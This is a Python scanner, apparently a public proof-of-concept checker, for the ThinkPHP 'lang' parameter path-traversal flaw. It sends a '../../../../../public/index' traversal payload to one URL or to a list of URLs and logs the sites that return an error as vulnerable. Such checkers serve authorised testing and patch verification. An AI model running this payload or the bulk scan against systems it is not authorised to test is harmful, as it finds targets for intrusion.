import sys
import getopt
import requests

def usage():
    print('Usage: python3 tp_lang_check.py -h')
    print('Usage: python3 tp_lang_check.py -u url')
    print('Example: python3 tp_lang_check.py -u http://')
    print('Usage: python3 tp_lang_check.py -r file')
    print('Example: python3 tp_lang_check.py -r url.txt')

def check(url):
    try:
        r = requests.get(url + '/index.php?lang=../../../../../public/index', verify=False, timeout=10)
        if r.status_code == 500:            
            print('[*] The url is vulnerable: ' + url)
            with open('vul.txt', 'a') as f:
                f.write(url + '\n')
        else:
            print('[-] The url is not vulnerable: ' + url)
    except:
        print('[-] The url is detection failure: ' + url)
        with open('fail.txt', 'a') as f:
            f.write(url + '\n')

def main():
    if len(sys.argv) == 1:
        print('''==========================================================================
 _____ ____    _        _    _   _  ____    ____ _   _ _____ ____ _  __
|_   _|  _ \  | |      / \  | \ | |/ ___|  / ___| | | | ____/ ___| |/ /
  | | | |_) | | |     / _ \ |  \| | |  _  | |   | |_| |  _|| |   | ' /
  | | |  __/  | |___ / ___ \| |\  | |_| | | |___|  _  | |__| |___| . \\
  |_| |_|     |_____/_/   \_\_| \_|\____|  \____|_| |_|_____\____|_|\_\\

                      6.0.1 < ThinkPHP <= 6.0.13
                      5.0.0 < ThinkPHP <= 5.0.12
                      5.1.0 < ThinkPHP <= 5.1.8
                   ThinkPHP Lang 漏洞检测 by iami233
==========================================================================''')
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'u:r:h')
    except getopt.GetoptError:
        sys.exit(1)

    for opt, arg in opts:
        if opt == '-u':
            check(arg)
        if opt == '-r':
            try:
                with open(arg, 'r') as f:
                    for url in f.readlines():
                        check(url.strip())                        
            except:
                print('[-] The file is not exist: ' + arg)
        if opt == '-h':
            usage()
            sys.exit(1)

if __name__ == '__main__':
    main()